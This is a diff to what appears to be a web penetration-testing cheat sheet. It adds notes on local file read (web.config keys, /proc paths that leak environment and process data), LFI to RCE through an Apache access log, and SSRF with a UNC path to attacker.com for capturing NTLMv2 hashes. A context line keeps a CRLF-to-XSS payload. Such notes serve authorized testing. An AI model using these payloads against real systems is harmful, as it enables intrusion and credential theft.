@@ -20,6 +20,30 @@ Escalation to XSS:
 ?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
 ```
 
+## Local File Read
+
+Read `web.config` file to obtain .NET ViewState's MachineKey and DecryptionKey, which are allow you to do deserialization attacks: https://www.silentgrid.com/blog/local-file-read-to-rce/.
+
+Leak some [juicy OS info](https://www.kernel.org/doc/html/latest/filesystems/proc.html):
+- /proc/version - OS Version
+- /proc/net/tcp - open TCP ports
+- /proc/net/udp - open UDP ports
+- /proc/sched_debug - can be used to retrieve running processes
+- /proc/mounts - mounted devices
+- /proc/[PID]/cmdline - command line that triggered the running process (fuzz pid here)
+- /proc/[PID]/environ - environment variables accessible to the process
+- /proc/[PID]/cwd - current working directory of the process
+- /proc/[PID]/fd/[n] - files opened by the process
+- /proc/[PID]/exe - link to the executable file
+
+## Local File Inclusion
+
+Read `../../../../var/log/apache2/access.log` or [same file via proc](https://xen0vas.github.io/Exploiting-the-LFI-vulnerability-using-the-proc-self-stat-method/#) to get RCE via `User-Agent`.
+
+## SSRF
+
+Try `\\attacker.com\test.jpg` links with a running Responder to capture Net-NTLMv2 hashes.
+
 ## Open Redirect
 
 Can be escalated when app uses OAuth; redirection can be done using `javascript:` scheme (see https://rdnzx.medium.com/chaining-open-redirect-with-xss-to-account-takeover-36acf218a6d5 and some more payloads for fuzzing in hacktricks).
